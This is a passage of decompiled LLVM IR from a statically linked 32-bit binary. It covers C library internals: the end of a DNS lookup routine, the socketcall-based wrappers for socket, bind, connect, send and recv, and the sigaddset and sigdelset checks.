dec_label_pc_805f9fb:                             ; preds = %dec_label_pc_805f9ef
  %v1_805f9fb = add i32 %v0_805f9ce, -44
  %v1_805fa02 = add i32 %v0_805f9ce, -24
  store i32 %v1_805fa02, i32* %eax.global-to-local, align 4
  %v10_805fa05 = icmp ult i32 %v1_805fa02, %v1_805f9fb
  %v0_805fa09 = load i32, i32* @ebp, align 4
  %v1_805fa09 = add i32 %v0_805fa09, 4
  %v1_805fa10 = add i32 %v0_805fa09, 12
  store i32 %v1_805fa10, i32* %ecx.global-to-local, align 4
  %v1_805fa13 = add i32 %v0_805fa09, 16
  store i32 %v1_805fa13, i32* @edx, align 4
  %storemerge17.v = select i1 %v10_805fa05, i32 24, i32 44
  %storemerge17 = add i32 %v0_805fa09, %storemerge17.v
  %stack_var_-92.0 = select i1 %v10_805fa05, i32 %v1_805fa02, i32 %v1_805f9fb
  store i32 %storemerge17, i32* @edi, align 4
  %tmp68 = icmp ult i32 %stack_var_-92.0, 256
  br i1 %tmp68, label %dec_label_pc_805fc61, label %dec_label_pc_805fa3a

dec_label_pc_805fa3a:                             ; preds = %dec_label_pc_805f9fb
  %v1_805fa3f = icmp eq i1 %v12_805f940, false
  %v0_805fa7d4 = load i32, i32* %tmp50, align 4
  %tmp55 = bitcast i8** %stack_var_-120 to i32*
  store i32 %v0_805fa7d4, i32* %tmp55, align 4
  br i1 %v1_805fa3f, label %dec_label_pc_805fa78, label %dec_label_pc_805fa41

dec_label_pc_805fa41:                             ; preds = %dec_label_pc_805fa3a
  store i32 %v0_805fa09, i32* %stack_var_-124, align 4
  %tmp54 = inttoptr i32 %v0_805fa7d4 to i16*
  %v5_805fa48 = call i32 @memcpy(i16* %tmp54, i32 %tmp27, i32 %v1_805fa10)
  store i32 %v1_805fa09, i32* %ecx.global-to-local, align 4
  %v0_805fa51 = load i32, i32* @ebp, align 4
  %v2_805fa51 = inttoptr i32 %v1_805fa09 to i32*
  store i32 %v0_805fa51, i32* %v2_805fa51, align 4
  %v2_805fa53 = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805fa53, i32* %eax.global-to-local, align 4
  %v0_805fa54 = load i8*, i8** %tmp, align 4
  %v3_805fa54 = load i8, i8* %v0_805fa54, align 1
  %v4_805fa54 = zext i8 %v3_805fa54 to i32
  store i32 %v4_805fa54, i32* %eax.global-to-local, align 4
  %v2_805fa57 = load i8*, i8** %stack_var_-120, align 4
  %v3_805fa57 = ptrtoint i8* %v2_805fa57 to i32
  store i32 %v3_805fa57, i32* %edx.global-to-local, align 4
  %v5_805fa58 = inttoptr i32 %v4_805fa54 to i8*
  store i8* %v5_805fa58, i8** %stack_var_-120, align 4
  %v1_805fa59 = ptrtoint i8* %v0_805fa54 to i32
  %v2_805fa59 = add i32 %v1_805fa59, 1
  %v3_805fa59 = inttoptr i32 %v2_805fa59 to i8*
  %v4_805fa59 = load i8, i8* %v3_805fa59, align 1
  %v5_805fa59 = zext i8 %v4_805fa59 to i32
  store i32 %v5_805fa59, i32* %eax.global-to-local, align 4
  store i32 %v5_805fa59, i32* %stack_var_-124, align 4
  %v2_805fa5e = add i32 %v1_805fa59, 2
  %v3_805fa5e = inttoptr i32 %v2_805fa5e to i8*
  %v4_805fa5e = load i8, i8* %v3_805fa5e, align 1
  %v5_805fa5e = zext i8 %v4_805fa5e to i32
  store i32 %v5_805fa5e, i32* %eax.global-to-local, align 4
  %v2_805fa63 = add i32 %v1_805fa59, 3
  %v3_805fa63 = inttoptr i32 %v2_805fa63 to i8*
  %v4_805fa63 = load i8, i8* %v3_805fa63, align 1
  %v5_805fa63 = zext i8 %v4_805fa63 to i32
  store i32 %v5_805fa63, i32* %eax.global-to-local, align 4
  %v0_805fa6d = load i32, i32* @edi, align 4
  %v5_805fa6d = inttoptr i32 %v0_805fa6d to i8*
  store i8* %v5_805fa6d, i8** %stack_var_-140, align 4
  %v4_805fa6e = call i32 @sprintf(i32 %v0_805fa6d, i32 ptrtoint ([25 x i8]* @global_var_806e588.677 to i32))
  br label %dec_label_pc_805face

dec_label_pc_805fa78:                             ; preds = %dec_label_pc_805fa3a
  store i32 %storemerge17, i32* @esi, align 4
  store i32 %v0_805fa09, i32* %stack_var_-124, align 4
  %tmp56 = inttoptr i32 %v0_805fa7d4 to i16*
  %v5_805fa81 = call i32 @memcpy(i16* %tmp56, i32 %tmp27, i32 %v1_805fa02)
  store i32 %v1_805fa13, i32* @eax, align 4
  %v0_805fa8a = load i32, i32* @ebp, align 4
  %v2_805fa8a = inttoptr i32 %v1_805fa13 to i32*
  store i32 %v0_805fa8a, i32* %v2_805fa8a, align 4
  %v1_805fa93 = add i32 %tmp27, -1
  %v9_805fa93 = icmp slt i32 %v1_805fa93, 0
  %v1_805fabc59 = icmp eq i1 %v9_805fa93, false
  %v0_805faaf.pre = load i32, i32* @esi, align 4
  br i1 %v1_805fabc59, label %dec_label_pc_805fa96, label %dec_label_pc_805fabe

dec_label_pc_805fa96:                             ; preds = %dec_label_pc_805fa78, %dec_label_pc_805fa96
  %v0_805faaf = phi i32 [ %v2_805fab5, %dec_label_pc_805fa96 ], [ %v0_805faaf.pre, %dec_label_pc_805fa78 ]
  %v0_805fa9a60 = phi i32 [ %v0_805faba.pre, %dec_label_pc_805fa96 ], [ %v1_805fa93, %dec_label_pc_805fa78 ]
  %v0_805fa96 = load i32, i32* @ebp, align 4
  %v2_805fa96 = add i32 %v0_805fa96, %v0_805fa9a60
  %v3_805fa96 = inttoptr i32 %v2_805fa96 to i8*
  %v4_805fa96 = load i8, i8* %v3_805fa96, align 1
  %v5_805fa96 = zext i8 %v4_805fa96 to i32
  %v6_805fa96 = load i32, i32* @edx, align 4
  %v7_805fa96 = and i32 %v6_805fa96, -256
  %v8_805fa96 = or i32 %v7_805fa96, %v5_805fa96
  store i32 %v8_805fa96, i32* %edx.global-to-local, align 4
  %v1_805fa9a = add i32 %v0_805fa9a60, -1
  store i32 %v1_805fa9a, i32* @ebx, align 4
  %tmp69 = urem i8 %v4_805fa96, 16
  %v1_805faa6 = zext i8 %tmp69 to i32
  store i32 %v1_805faa6, i32* %eax.global-to-local, align 4
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806e5a1.678, i32 0, i32 0), i8** %stack_var_-120, align 4
  store i32 %v0_805faaf, i32* %stack_var_-124, align 4
  %v3_805fab0 = call i32 @sprintf(i32 %v0_805faaf, i32 ptrtoint ([7 x i8]* @global_var_806e5a1.678 to i32))
  store i32 %v3_805fab0, i32* @eax, align 4
  %v0_805fab5 = load i32, i32* @esi, align 4
  %v2_805fab5 = add i32 %v0_805fab5, %v3_805fab0
  store i32 %v2_805fab5, i32* @esi, align 4
  %v0_805faba.pre = load i32, i32* @ebx, align 4
  %v2_805faba = icmp slt i32 %v0_805faba.pre, 0
  %v1_805fabc = icmp eq i1 %v2_805faba, false
  br i1 %v1_805fabc, label %dec_label_pc_805fa96, label %dec_label_pc_805fabe

dec_label_pc_805fabe:                             ; preds = %dec_label_pc_805fa78, %dec_label_pc_805fa96
  %v0_805fac5 = phi i32 [ %v2_805fab5, %dec_label_pc_805fa96 ], [ %v0_805faaf.pre, %dec_label_pc_805fa78 ]
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_806e5a8.679, i32 0, i32 0), i8** %stack_var_-120, align 4
  store i32 %v0_805fac5, i32* %stack_var_-124, align 4
  %v3_805fac6 = inttoptr i32 %v0_805fac5 to i8*
  %v4_805fac6 = call i32 @strcpy(i8* %v3_805fac6, i32 ptrtoint ([9 x i8]* @global_var_806e5a8.679 to i32))
  br label %dec_label_pc_805face

dec_label_pc_805face:                             ; preds = %dec_label_pc_805fa41, %dec_label_pc_805fabe
  %storemerge18 = phi i32 [ %v4_805fa6e, %dec_label_pc_805fa41 ], [ %v4_805fac6, %dec_label_pc_805fabe ]
  store i32 %storemerge18, i32* %eax.global-to-local, align 4
  store i32 %v1_805fa09, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebp, align 4
  %v1_805fad4 = add i32 %v0_805fa09, 8
  %v2_805fad4 = inttoptr i32 %v1_805fad4 to i32*
  store i32 0, i32* %v2_805fad4, align 4
  store i32 %v1_805fa10, i32* @ecx, align 4
  %v0_805fadf = load i32, i32* @edi, align 4
  %v2_805fadf = inttoptr i32 %v1_805fa10 to i32*
  store i32 %v0_805fadf, i32* %v2_805fadf, align 4
  %v0_805fae1 = load i32, i32* @ecx, align 4
  %v1_805fae1 = add i32 %v0_805fae1, 4
  %v2_805fae1 = inttoptr i32 %v1_805fae1 to i32*
  store i32 0, i32* %v2_805fae1, align 4
  %v2_805faf3 = ptrtoint i32* %stack_var_-36 to i32
  %v2_805fb20 = ptrtoint i32* %stack_var_-20 to i32
  %v8_805fb68 = inttoptr i32 %tmp19 to i8*
  %v9_805fb5e = icmp eq i32 %tmp20, 5
  %v1_805fb61 = icmp eq i1 %v9_805fb5e, false
  br label %dec_label_pc_805fae8

dec_label_pc_805fae8:                             ; preds = %dec_label_pc_805fb8c, %dec_label_pc_805face
  store i8* inttoptr (i32 134589241 to i8*), i8** %stack_var_-120, align 4
  store i32 %v2_805faf3, i32* @ebx, align 4
  store i32 %v2_805faf3, i32* %stack_var_-124, align 4
  %v5_805faf8 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-36, i32 134589241, i32 ptrtoint (i32* @global_var_8075680.674 to i32))
  store i32 %v5_805faf8, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8075680.674 to i32), i32* %stack_var_-124, align 4
  %v1_805fb04 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075680.674 to i32))
  %v2_805fb0f = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805fb0f, i32* @ecx, align 4
  %v2_805fb10 = load i8*, i8** %stack_var_-120, align 4
  %v3_805fb10 = ptrtoint i8* %v2_805fb10 to i32
  store i32 %v3_805fb10, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-120, align 4
  store i32 %v2_805faf3, i32* %stack_var_-124, align 4
  %v4_805fb14 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-36, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  store i8* %v4_805f938, i8** %stack_var_-120, align 4
  store i32 %v2_805fb20, i32* %eax.global-to-local, align 4
  store i32 %v2_805fb20, i32* %stack_var_-124, align 4
  %v0_805fb2a = load i32, i32* @esi, align 4
  %v0_805fb2d = load i32, i32* @edi, align 4
  %v5_805fb2d = inttoptr i32 %v0_805fb2d to i8*
  store i8* %v5_805fb2d, i8** %stack_var_-140, align 4
  %v10_805fb2e = call i32 @__dns_lookup(i8* %v5_805fb2d, i32 12, i32 %v0_805fb2a, i32 ptrtoint (i32* @global_var_807f834.676 to i32), i32 %v2_805fb20, i32 %v2_805f92e)
  store i32 %v10_805fb2e, i32* %eax.global-to-local, align 4
  %v2_805fb36 = icmp slt i32 %v10_805fb2e, 0
  br i1 %v2_805fb36, label %dec_label_pc_805fc3b, label %dec_label_pc_805fb3e

dec_label_pc_805fb3e:                             ; preds = %dec_label_pc_805fae8
  %v3_805fb43 = load i32, i32* %stack_var_-76, align 4
  %v8_805fb43 = inttoptr i32 %v3_805fb43 to i8*
  store i8* %v8_805fb43, i8** %stack_var_-120, align 4
  %v0_805fb47 = load i32, i32* @edi, align 4
  store i32 %v0_805fb47, i32* %stack_var_-124, align 4
  %v4_805fb48 = inttoptr i32 %v0_805fb47 to i8*
  %v5_805fb48 = call i32 @strncpy(i8* %v4_805fb48, i32 %v3_805fb43, i32 %stack_var_-92.0)
  store i32 %v5_805fb48, i32* %eax.global-to-local, align 4
  %v2_805fb4d = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805fb4d, i32* @ecx, align 4
  %v3_805fb4e = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_805fb4e, i32* %stack_var_-124, align 4
  %v1_805fb52 = call i32 @free(i32 %v3_805fb4e)
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  br i1 %v1_805fb61, label %dec_label_pc_805fb9b, label %dec_label_pc_805fb63

dec_label_pc_805fb63:                             ; preds = %dec_label_pc_805fb3e
  %v0_805fb67 = load i32, i32* @edi, align 4
  store i8* %v8_805fb68, i8** %stack_var_-120, align 4
  %v3_805fb6c = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805fb6c, i32* %stack_var_-124, align 4
  %v5_805fb70 = call i32 @__decode_dotted(i32 %v3_805fb6c, i32 %tmp19, i32 %v0_805fb67, i32 %stack_var_-92.0)
  store i32 %v5_805fb70, i32* %eax.global-to-local, align 4
  %v2_805fb75 = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805fb75, i32* %edx.global-to-local, align 4
  %v3_805fb76 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805fb76, i32* %stack_var_-124, align 4
  store i32 %v5_805fb70, i32* @ebx, align 4
  %v1_805fb7c = call i32 @free(i32 %v3_805fb76)
  store i32 %v1_805fb7c, i32* %eax.global-to-local, align 4
  %v2_805fb84 = icmp slt i32 %v5_805fb70, 0
  br i1 %v2_805fb84, label %dec_label_pc_805fc4f, label %dec_label_pc_805fb8c

dec_label_pc_805fb8c:                             ; preds = %dec_label_pc_805fb63
  %v0_805fb8c = load i32, i32* @ebp, align 4
  %v1_805fb8c = add i32 %v0_805fb8c, 1
  store i32 %v1_805fb8c, i32* @ebp, align 4
  %v7_805fb90 = icmp sgt i32 %v1_805fb8c, 5
  br i1 %v7_805fb90, label %dec_label_pc_805fc4f, label %dec_label_pc_805fae8

dec_label_pc_805fb9b:                             ; preds = %dec_label_pc_805fb3e
  %v9_805fb9b = icmp eq i32 %tmp20, 12
  %v1_805fb9e = icmp eq i1 %v9_805fb9b, false
  br i1 %v1_805fb9e, label %dec_label_pc_805fc11, label %dec_label_pc_805fba0

dec_label_pc_805fba0:                             ; preds = %dec_label_pc_805fb9b
  %v0_805fba4 = load i32, i32* @edi, align 4
  store i8* %v8_805fb68, i8** %stack_var_-120, align 4
  %v3_805fba9 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805fba9, i32* %stack_var_-124, align 4
  %v5_805fbad = call i32 @__decode_dotted(i32 %v3_805fba9, i32 %tmp19, i32 %v0_805fba4, i32 %stack_var_-92.0)
  %v2_805fbb2 = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805fbb2, i32* %eax.global-to-local, align 4
  %v3_805fbb3 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805fbb3, i32* %stack_var_-124, align 4
  %v1_805fbb7 = call i32 @free(i32 %v3_805fbb3)
  store i32 %tmp25, i32* %edx.global-to-local, align 4
  store i32 4, i32* %eax.global-to-local, align 4
  %v0_805fbc8 = load i32, i32* @edi, align 4
  %v2_805fbc8 = inttoptr i32 %tmp25 to i32*
  store i32 %v0_805fbc8, i32* %v2_805fbc8, align 4
  store i32 %tmp28, i32* %ecx.global-to-local, align 4
  %v1_805fbd4 = load i32, i32* %edx.global-to-local, align 4
  %v2_805fbd4 = add i32 %v1_805fbd4, 8
  %v3_805fbd4 = inttoptr i32 %v2_805fbd4 to i32*
  store i32 %tmp28, i32* %v3_805fbd4, align 4
  %v0_805fbd7 = load i32, i32* %ecx.global-to-local, align 4
  %v9_805fbd7 = icmp eq i32 %v0_805fbd7, 2
  %v1_805fbdf = icmp eq i1 %v9_805fbd7, false
  %v2_805fbdf = load i32, i32* %eax.global-to-local, align 4
  %v4_805fbdf = select i1 %v1_805fbdf, i32 16, i32 %v2_805fbdf
  store i32 %tmp25, i32* %edx.global-to-local, align 4
  %v2_805fbe6 = add i32 %tmp25, 12
  %v3_805fbe6 = inttoptr i32 %v2_805fbe6 to i32*
  store i32 %v4_805fbdf, i32* %v3_805fbe6, align 4
  %v1_805fbed = load i32, i32* %edx.global-to-local, align 4
  %v2_805fbed = add i32 %v1_805fbed, 16
  %v3_805fbed = inttoptr i32 %v2_805fbed to i32*
  store i32 %v1_805fa09, i32* %v3_805fbed, align 4
  %v1_805fbf4 = load i32, i32* %edx.global-to-local, align 4
  %v2_805fbf4 = add i32 %v1_805fbf4, 4
  %v3_805fbf4 = inttoptr i32 %v2_805fbf4 to i32*
  store i32 %v1_805fa10, i32* %v3_805fbf4, align 4
  store i32 %tmp31, i32* %ecx.global-to-local, align 4
  %v0_805fbfe = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805fbfe, i32* %v1_805f922, align 4
  store i32 0, i32* %v1_805f9a3, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805fc66

dec_label_pc_805fc11:                             ; preds = %dec_label_pc_805fb9b
  %v3_805fc14 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805fc14, i32* %stack_var_-124, align 4
  %v1_805fc18 = call i32 @free(i32 %v3_805fc14)
  store i32 %tmp26, i32* %edx.global-to-local, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 4, i32* %v1_805f9a3, align 4
  br label %dec_label_pc_805fc66

dec_label_pc_805fc34:                             ; preds = %dec_label_pc_805f960, %dec_label_pc_805f947, %entry
  store i32 22, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805fc66

dec_label_pc_805fc3b:                             ; preds = %dec_label_pc_805fae8
  store i32 %tmp26, i32* %ecx.global-to-local, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_805f9a3, align 4
  br label %dec_label_pc_805fc66

dec_label_pc_805fc4f:                             ; preds = %dec_label_pc_805fb8c, %dec_label_pc_805fb63
  store i32 3, i32* %v1_805f9a3, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805fc66

dec_label_pc_805fc61:                             ; preds = %dec_label_pc_805f9fb, %dec_label_pc_805f9ef, %dec_label_pc_805f9e6, %dec_label_pc_805f9da, %dec_label_pc_805f9ce, %dec_label_pc_805f9b3
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805fc66

dec_label_pc_805fc66:                             ; preds = %dec_label_pc_805f9aa, %dec_label_pc_805f966, %dec_label_pc_805fc4f, %dec_label_pc_805fc3b, %dec_label_pc_805fc34, %dec_label_pc_805fc11, %dec_label_pc_805fba0, %dec_label_pc_805fc61
  store i32 %v0_805f902, i32* @esi, align 4
  store i32 %v0_805f901, i32* @edi, align 4
  store i32 %v0_805f900, i32* @ebp, align 4
  %v0_805fc6d = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_805fc6d

; uselistorder directives
  uselistorder i32 %v5_805fb70, { 1, 0, 2 }
  uselistorder i32 %v0_805fac5, { 1, 0 }
  uselistorder i32 %v0_805faba.pre, { 1, 0 }
  uselistorder i32 %v2_805fab5, { 1, 2, 0 }
  uselistorder i32 %v0_805faaf, { 1, 0 }
  uselistorder i32 %v0_805faaf.pre, { 1, 0 }
  uselistorder i32 %v0_805fa7d4, { 1, 0, 2 }
  uselistorder i32 %stack_var_-92.0, { 3, 2, 1, 0 }
  uselistorder i32 %v1_805fa13, { 1, 0, 2 }
  uselistorder i32 %v1_805fa10, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_805fa09, { 2, 3, 1, 0 }
  uselistorder i32 %v0_805fa09, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i1 %v10_805fa05, { 1, 0 }
  uselistorder i32 %v1_805fa02, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805f9ce, { 2, 1, 3, 0, 4, 5 }
  uselistorder i32* %v1_805f9a3, { 2, 4, 0, 3, 1, 5 }
  uselistorder i32* %stack_var_-76, { 1, 2, 0, 3 }
  uselistorder i8** %stack_var_-120, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0, 2, 1 }
  uselistorder i8** %stack_var_-140, { 2, 1, 3, 0 }
  uselistorder i32 %tmp31, { 3, 0, 1, 2 }
  uselistorder i32 %tmp28, { 3, 5, 2, 4, 0, 1 }
  uselistorder i32 %tmp27, { 6, 2, 3, 0, 1, 5, 4 }
  uselistorder i32 %tmp26, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp25, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp20, { 0, 2, 1 }
  uselistorder i8** %tmp, { 2, 0, 1 }
  uselistorder i32* %eax.global-to-local, { 29, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 23, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 30, 31, 32, 33 }
  uselistorder i8* inttoptr (i32 1 to i8*), { 2, 0, 3, 4, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 (i32, i32, i32)* @__open_nameservers, { 2, 1, 0 }
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805fc66, { 7, 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_805face, { 1, 0 }
  uselistorder label %dec_label_pc_805fabe, { 1, 0 }
  uselistorder label %dec_label_pc_805fa96, { 1, 0 }
  uselistorder label %dec_label_pc_805f960, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805fc8b = ptrtoint i32* %stack_var_-12 to i32
  %v2_805fc92 = call i32 @__socketcall(i32 5, i32 %v2_805fc8b)
  ret i32 %v2_805fc92

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805fcb7 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805fcbe = call i32 @__socketcall(i32 2, i32 %v2_805fcb7)
  ret i32 %v2_805fcbe

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805fce3 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805fcea = call i32 @__socketcall(i32 3, i32 %v2_805fce3)
  ret i32 %v2_805fcea

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_805fd1f = ptrtoint i32* %stack_var_-20 to i32
  %v2_805fd26 = call i32 @__socketcall(i32 15, i32 %v2_805fd1f)
  ret i32 %v2_805fd26

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_805fd43 = ptrtoint i32* %stack_var_-8 to i32
  %v2_805fd4a = call i32 @__socketcall(i32 4, i32 %v2_805fd43)
  ret i32 %v2_805fd4a

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_805fd77 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805fd7e = call i32 @__socketcall(i32 10, i32 %v2_805fd77)
  ret i32 %v2_805fd7e

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_805fdbb = ptrtoint i32* %stack_var_-24 to i32
  %v2_805fdc2 = call i32 @__socketcall(i32 12, i32 %v2_805fdbb)
  ret i32 %v2_805fdc2

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_recvmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805fde7 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805fdee = call i32 @__socketcall(i32 17, i32 %v2_805fde7)
  ret i32 %v2_805fdee

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_805fe1b = ptrtoint i32* %stack_var_-16 to i32
  %v2_805fe22 = call i32 @__socketcall(i32 9, i32 %v2_805fe1b)
  ret i32 %v2_805fe22

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805fe47 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805fe4e = call i32 @__socketcall(i32 16, i32 %v2_805fe47)
  ret i32 %v2_805fe4e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_805fe8b = ptrtoint i32* %stack_var_-24 to i32
  %v2_805fe92 = call i32 @__socketcall(i32 11, i32 %v2_805fe8b)
  ret i32 %v2_805fe92

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_805fec7 = ptrtoint i32* %stack_var_-20 to i32
  %v2_805fece = call i32 @__socketcall(i32 14, i32 %v2_805fec7)
  ret i32 %v2_805fece

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805fef3 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805fefa = call i32 @__socketcall(i32 1, i32 %v2_805fef3)
  ret i32 %v2_805fefa

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 0, 1, 8, 12, 7, 11, 10, 5, 4, 9, 6, 2, 3 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_805ff1c, label %dec_label_pc_805ff0f

dec_label_pc_805ff0f:                             ; preds = %entry
  %v1_805ff0f = add i32 %arg1, -64
  %v3_805ff0f = sub i32 63, %arg1
  %v4_805ff0f = and i32 %v3_805ff0f, %arg1
  %v5_805ff0f = icmp slt i32 %v4_805ff0f, 0
  %v6_805ff0f = icmp eq i32 %v1_805ff0f, 0
  %v7_805ff0f = icmp slt i32 %v1_805ff0f, 0
  %v3_805ff12 = icmp eq i1 %v7_805ff0f, %v5_805ff0f
  %v4_805ff12 = icmp eq i1 %v6_805ff0f, false
  %v5_805ff12 = and i1 %v4_805ff12, %v3_805ff12
  br i1 %v5_805ff12, label %dec_label_pc_805ff1c, label %dec_label_pc_805ff14

dec_label_pc_805ff14:                             ; preds = %dec_label_pc_805ff0f
  %v4_805ff17 = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_805ff1c

dec_label_pc_805ff1c:                             ; preds = %dec_label_pc_805ff0f, %entry, %dec_label_pc_805ff14
  %v1_805ff1c = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_805ff21 = inttoptr i32 %v1_805ff1c to i32*
  store i32 22, i32* %v1_805ff21, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_805ff0f, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805ff1c, { 2, 0, 1 }
}

define i32 @__GI_sigdelset(i32 %arg1) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_805ff48, label %dec_label_pc_805ff3b

dec_label_pc_805ff3b:                             ; preds = %entry
  %v1_805ff3b = add i32 %arg1, -64
  %v3_805ff3b = sub i32 63, %arg1
  %v4_805ff3b = and i32 %v3_805ff3b, %arg1
  %v5_805ff3b = icmp slt i32 %v4_805ff3b, 0
  %v6_805ff3b = icmp eq i32 %v1_805ff3b, 0
  %v7_805ff3b = icmp slt i32 %v1_805ff3b, 0
  %v3_805ff3e = icmp eq i1 %v7_805ff3b, %v5_805ff3b
  %v4_805ff3e = icmp eq i1 %v6_805ff3b, false
  %v5_805ff3e = and i1 %v4_805ff3e, %v3_805ff3e
